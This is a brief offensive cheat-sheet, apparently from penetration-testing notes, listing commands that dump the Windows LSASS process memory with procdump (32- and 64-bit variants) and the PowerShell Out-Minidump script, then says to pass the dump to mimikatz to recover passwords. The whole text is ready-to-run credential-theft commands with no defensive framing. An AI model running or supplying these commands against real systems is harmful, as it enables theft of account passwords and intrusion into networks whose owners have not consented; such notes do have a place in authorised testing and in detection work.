### Procdump
```
C:\Windows\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp     => For 32 bit system
C:\Windows\temp\procdump.exe -accepteula -ma -64 lsass.exe lsass.dmp => For 64 bit system
Download the lsass.dmp and use mimikatz to get the passwords.
```

### Powershell Out-MiniDump

```
c:\path\to\Out-Minidump.ps1
Create dump of the process using this syntax:
Get-Process lsass | Out-Minidump -DumpFilePath C:\Windows\Temp

```
